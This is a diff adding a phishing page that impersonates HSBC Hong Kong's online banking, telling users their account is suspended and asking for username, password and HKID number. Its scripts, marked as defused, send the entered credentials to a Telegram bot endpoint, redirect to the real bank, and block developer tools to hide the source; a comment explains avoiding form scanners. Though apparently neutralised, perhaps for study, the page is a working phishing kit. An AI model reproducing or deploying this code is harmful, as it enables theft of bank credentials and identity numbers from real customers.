@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="zh-HK">
+<head>
+<meta charset="utf-8">
+<title>HSBC 網上理財 - 重新登入</title>
+<link rel="icon" href="https://sink.invalid/www.hsbc.com.hk/favicon.ico">
+<style>
+  body { font-family: system-ui, sans-serif; margin: 0; background: #f6f7f9; color: #202124;
+         -webkit-user-select: none; user-select: none; }
+  .wrap { max-width: 460px; margin: 56px auto; background: #fff; padding: 32px; border-radius: 12px;
+          box-shadow: 0 1px 4px rgba(0,0,0,.12); }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  p.lede { margin: 0 0 24px; color: #5f6368; font-size: 14px; }
+  .field { display: block; margin: 14px 0 4px; font-size: 13px; font-weight: 600; }
+  .box { width: 100%; box-sizing: border-box; padding: 9px 10px; font-size: 14px;
+         border: 1px solid #dadce0; border-radius: 6px; }
+  button { margin-top: 22px; width: 100%; padding: 11px; font-size: 15px; border: 0;
+           border-radius: 6px; background: #db0011; color: #fff; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>你嘅網上理財服務已被暫停</h1>
+<p class="lede">系統偵測到異常登入，請重新驗證你嘅身份以解除限制。</p>
+
+<!-- No <form> element at all: the inputs are loose and wired to a handler,
+     which is how a kit stays invisible to a scanner that only reads forms. -->
+<span class="field">用戶名稱</span>
+<input class="box" id="uid" name="username" autocomplete="username" required>
+<span class="field">網上理財密碼</span>
+<input class="box" id="pw" name="password" type="password" autocomplete="current-password" required>
+<span class="field">身份證號碼</span>
+<input class="box" id="hkid" name="hkid" placeholder="A123456(7)" required>
+<button type="button" id="go">確認身份</button>
+
+</div>
+
+<script type="text/plain" data-ppg-defused="1">
+// Where the credentials actually go.
+var SINK = "https://api.telegram.org/bot7583910264:AAHqZm2kXpLvNc8RtYuIoP3aSdFgHjK1234/sendMessage";
+document.getElementById("go").addEventListener("click", function () {
+  fetch(SINK, {
+    method: "POST",
+    body: JSON.stringify({
+      chat_id: "884213077",
+      text: document.getElementById("uid").value + " / " +
+            document.getElementById("pw").value + " / " +
+            document.getElementById("hkid").value
+    })
+  });
+  location.href = "https://www.hsbc.com.hk/";
+});
+</script>
+
+<script type="text/plain" data-ppg-defused="1">
+// Keep the reader out of the source above.
+setInterval(function () { debugger; }, 50);
+document.onkeydown = function (e) {
+  if (e.keyCode == 123) return false;
+  if (e.ctrlKey && e.shiftKey && e.keyCode == 73) return false;
+  if (e.ctrlKey && e.keyCode == 85) return false;
+};
+setInterval(function () { console.clear(); }, 800);
+</script>
+</body>
+</html>
